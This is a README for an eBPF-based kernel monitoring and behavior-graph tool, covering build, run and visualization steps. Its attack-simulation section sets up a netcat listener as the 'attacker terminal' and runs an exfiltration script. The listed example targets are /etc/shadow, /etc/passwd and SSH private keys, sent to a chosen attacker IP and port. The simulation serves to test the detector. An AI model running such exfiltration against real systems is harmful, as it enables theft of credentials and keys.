# K-Guard Pipeline

An interactive kernel-space runtime monitoring and behavioral visualization pipeline driven by eBPF, `libbpf`, and NetworkX.

## Prerequisites

Install the required system build dependencies and generate the `vmlinux.h` header file from your running kernel:

```bash
sudo apt update
sudo apt install -y clang llvm libbpf-dev libelf-dev build-essential bpftool python3-pip
pip3 install -r requirements.txt

# Generate the kernel definition header
mkdir include && bpftool btf dump file /sys/kernel/btf/vmlinux format c > include/vmlinux.h
```

## Compilation
```
make clean && make
```

## Execution
```
sudo ./monitor | python3 src/user/graphengine.py
```

## Attack Simulation

1. Data Exfiltration 
Start a local TCP listener using netcat. This acts as the attacker terminal, waiting to receive ex data.
```
nc -lnvp 9999
```
Make the script executable and run it against your local listener
```
chmod +x scenario2_exfil.py
python3 script/exfil.py
```
For custom attacker's ip, attacker's port and file, use following command:
```
python3 script/exfil.py --ip <custom_IP> --port <custom_PORT> --file <custom_file (For ex: /etc/shadow, /etc/passwd, ~/.ssh/id_rsa)>
```

## Viewing the live Topology

The engine auto-saves updates to disk every 5 seconds under `output/`. Open the generated interactive
standalone webpage from that directory.

On Linux: 
```
xdg-open output/kguard_interactive_graph.html
```
On macOS:
```
open output/kguard_interactive_graph.html
```
